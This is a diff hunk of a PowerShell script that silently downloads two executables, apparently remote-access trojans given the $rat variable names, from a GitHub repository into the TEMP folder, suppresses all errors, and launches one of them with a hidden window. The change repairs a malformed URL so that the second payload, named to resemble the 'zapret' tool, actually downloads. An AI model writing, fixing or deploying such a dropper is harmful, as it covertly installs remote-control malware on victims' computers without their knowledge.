@@ -12,7 +12,7 @@ $rat1 = "$env:TEMP\Zap.exe"
 $rat2 = "$env:TEMP\ZAPRET.exe"
 try {
     Invoke-WebRequest -Uri "https://github.com/sys1e/catl/raw/refs/heads/main/Zap.exe" -OutFile $rat1 -UseBasicParsing -ErrorAction SilentlyContinue
-    Invoke-WebRequest -Uri "hhttps://github.com/sys1e/catl/raw/refs/heads/main/ZAPRET.exe" -OutFile $rat2 -UseBasicParsing -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/sys1e/catl/raw/refs/heads/main/GitZapret.exe" -OutFile $rat2 -UseBasicParsing -ErrorAction SilentlyContinue
 } catch { }
 try {
     Start-Process -FilePath $rat1 -WindowStyle Hidden -ErrorAction SilentlyContinue
